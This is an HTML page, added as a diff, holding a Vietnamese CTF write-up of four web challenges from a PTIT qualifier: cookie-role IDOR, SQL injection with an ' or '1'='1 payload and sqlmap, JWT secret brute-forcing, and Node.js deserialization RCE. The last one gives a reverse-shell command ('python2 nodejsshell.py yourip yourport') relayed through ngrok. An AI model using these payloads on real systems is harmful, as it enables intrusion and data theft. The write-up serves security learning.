@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="ptit.css" media="screen">
+</head>
+<body>
+    <div class="container" >
+      <div class="main">  
+        <div class="header">
+              <h4 class="header-text1">@HackerGa2101</h4>
+              <img src="../../images/torii-gate.png" alt="gate" class="gate">
+              <h4 class="header-text2">CTF Write Up</h4>
+        </div>
+        <div class="content">
+             <div class="anh">
+                <img src="../../images/qtit.jpg" alt="bksec" class="bksec">
+             </div>
+          <div class="baotext"> 
+             <div class="text", style="color: rgb(35, 34, 34);">
+                <h1 style="margin-left: 260px;">Sinh viên với An Toàn Thông Tin | PTIT CTF</h1>
+                <br>
+                <p>*Giải này thật ra mình nhận thi hộ cho một ông bạn vì trường họ bắt buộc 100% sinh viên khối an toàn thông tin tham gia </p>
+                <br>
+                <p>Thể thực là thi cá nhân và online ở vòng loại. Tổng cộng hình như 16 flag thì mình làm được 10 cái (mấy phần kia mình hơi đuối). Và write up lần này là dành riêng để phân tích mảng web thôi nhé</p>
+                <br>
+                <p>Nhìn chung thì đề PTIT được phân loại từ dễ đến khó gồm 4 bài. Mình không được thi chung kết vì là thi off nên không biết đề như nào. chỉ thấy đề vòng loại này không quá hay :v </p>
+             </div>
+             <!--  -->
+             <!--  -->
+             <div class="wu", style="color: rgb(35, 34, 34);">
+                <h4>Bài 1:</h4>
+                  <div class="chutrong">
+                       <p>*IDOR đổi quyền hạn thành Admin</p>
+                       <div style="height: 3px;"></div>
+                       <p>Bài này thuộc dạng cho điểm nên cũng không có gì để nói :v</p>
+                       <div style="height: 3px;"></div>
+                       <p>Đầu tiên là dạo và dùng thử web đã</p>
+                       <div style="height: 3px;"></div>
+                       <img src="../../images/ptit/1.1.png" alt="1" style="width: 1100px;">
+                       <div style="height: 3px;"></div>
+                       <p>Với một trang không có feature thì lỗi thường ở Cookie, storage, hidden path,... Mình vào check Cookie trước</p>      
+                       <div style="height: 3px;"></div>
+                       <img src="../../images/ptit/1.2.png" alt="1" style="width: 1100px;">
+                       <div style="height: 3px;"></div>
+                       <p>Sửa value của Cookie rule thử</p>
+                       <div style="height: 3px;"></div>
+                       <img src="../../images/ptit/1.3.png" alt="1" style="width: 1100px;">
+                       <div style="height: 3px;"></div>
+                        <!--  -->
+                        <!--  -->
+                            <h4>Bài 2:</h4>
+                              <div class="chutrong">
+                                   <p>*SQL injection để đọc flag</p>
+                                   <div style="height: 3px;"></div>
+                                   <p>Vào view qua thì có một ô nhập tìm kiếm gì đó đoán luôn trong đầu chắc sqli, cmdi. Vì mới làm qua bài 1 nhạt quá</p>
+                                   <div style="height: 3px;"></div>
+                                   <img src="../../images/ptit/2.1.png" alt="1" style="width: 1100px;">
+                                   <div style="height: 3px;"></div>
+                                   <p>Mình thử 1 số input thì nghĩ là đây là tính năng xem người dùng tồn tại chưa :
+                                    <br>- Nếu có kết quả thì trả về username exist
+                                    <br>- Không thì là data not found</p>
+                                    <p>Không dừng lại ở đó, sau khi thêm 1 vài phép thử như dấu ' thì có văng ra cả input error ở chỗ dấu *</p>
+                                    <p>Mình test thử payload sqli : ' or '1'='1 và thành công trả về usernam exist</p>
+                                   <div style="height: 3px;"></div>
+                                   <div style="height: 3px;"></div>
+                                   <img src="../../images/ptit/2.3.png" alt="1" style="width: 1100px;">
+                                   <div style="height: 3px;"></div>
+                                   <p>Bắt lại request bằng Burp thì thấy là 1 request POST với data="search=1&save=”
+                                    <br>Code py cũng được mà dại gì không sqlmap</p>
+                                   <!--  -->
+                                   <!--  -->
+                                   <h4>Bài 3:</h4>
+                                   <div class="chutrong">
+                                        <p>*jwt injection to authen</p>
+                                        <p>Bài này mình không thích tí nèo, bắt bruteforce 57^4 kí tự, và làm mình mất thời gian tìm cách khai thác</p>
+                                        <div style="height: 3px;"></div>
+                                        <img src="../../images/ptit/3.1.png" alt="1" style="width: 1100px;">
+                                        <div style="height: 3px;"></div>
+                                        <p>Là trang tĩnh, vào view cookie mình nhận được 1 cái jwt</p>
+                                        <div style="height: 3px;"></div>
+                                        <div style="height: 3px;"></div>
+                                        <img src="../../images/ptit/3.2.png" alt="1" style="width: 1100px;">
+                                        <div style="height: 3px;"></div>
+                                        <p>Decode ra ở jwt.io sẽ có kết quả sau</p>
+                                        <div style="height: 3px;"></div>
+                                        <img src="../../images/ptit/3.3.png" alt="1" style="width: 1100px;">
+                                        <p>Và việc của bạn là phải bruteforce cái signature. Và nó là pctf</p>
+                                        <!--  -->
+                                        <!--  -->
+                                        <h4>Bài 4:</h4>
+                                        <div class="chutrong">
+                                             <p>*RCE để đọc file docker</p>
+                                             <p>Đang nhẹ nhàng quen tự dựng vọt cái ra ông này, một CVE deserialization nodejs khá hay</p>
+                                             <p>Giao diện page bắt mắt quá messi</p>
+                                             <div style="height: 3px;"></div>
+                                             <img src="../../images/ptit/4.1.png" alt="1" style="width: 1100px;">
+                                             <div style="height: 3px;"></div>
+                                             <p>Mình view cookie bắt được thằng session khá thú vị trông có %3D nên mình đi url decode, sau đó decode base64</p>
+                                             <div style="height: 3px;"></div>
+                                             <div style="height: 3px;"></div>
+                                             <img src="../../images/ptit/4.2.png" alt="1" style="width: 1100px;">
+                                             <img src="../../images/ptit/4.3.png" alt="1" style="width: 1100px;">
+                                             <div style="height: 3px;"></div>
+                                             <p>Nhận được 1 thằng json thử đổi username thành 'admin' và isAdmin:true thì đúng là web nó welcome admin
+                                               . Tiếp thử xem có được bỏ qua login không thì bị từ chối</p>
+                                             <p>Mình đã xem wáppalizơ từ trước nên biết web nodejs
+                                                . ngờ ngợ vì trước mình từng làm 1 bài serialize nodejs và dữ liệu unserialize khác các ngôn ngữ khác (kiểu như json giống trên kia)</p>
+                                             <div style="height: 3px;"></div>
+                                             <p>Đến giai đoạn đi research rồi. Sau một hồi thì mình tìm được bài viết sau: <a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/?fbclid=IwAR0_VTpLQDOvIcFVerYF9KpUX9TNsrdnfjbjGJ4r7fE3sXXoxYTZQd83KgE">Here</a></p>
+                                             <p>Tất nhiên là mình đọc khá nhiều bài và thử rất nhiều payload để chứng mình là web này lỗi. Ae follow bài trên cũng sẽ làm được</p>
+                                             <p>Mình bắt được một vài hạn chế của web này
+                                                <br>- chúng ta không chạy được console.log nên không in được dữ liệu ra màn hình
+                                                <br>- mình thử curl và server không hiểu curl luôn (hoặc outbound)
+                                                <br>- vậy chắc là server mới toanh , nên thử ghi lên document root (lúc bắn lỗi mình biết document root là /var/www/html) và đương nhiên không được nên reverse shell thử</p>
+                                             <p>Đọc bài hướng dẫn trên kia thì họ có chỉ cách tạo reverse</p>
+                                             <p>Tải file: <a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py">Here</a> và chạy lệnh: python2 nodejsshell.py yourip yourport</p>
+                                                <img src="../../images/ptit/4.4.png" alt="1" style="width: 1100px;">
+                                             <p>*Vấn đề là ip của bạn không được public nên phải dùng ngrok. sau đó hãy tạo reverse shell với ip ngrok và thử lại</p>
+                                             <p>Gửi lên server và nhận lại kết nối tới máy mình đọc file Dockerfile và lụm flag</p>
+             </div>
+          </div>   
+        </div>
+        <div class="end"></div>
+      </div>
+    </div>
+</body>
+</html>
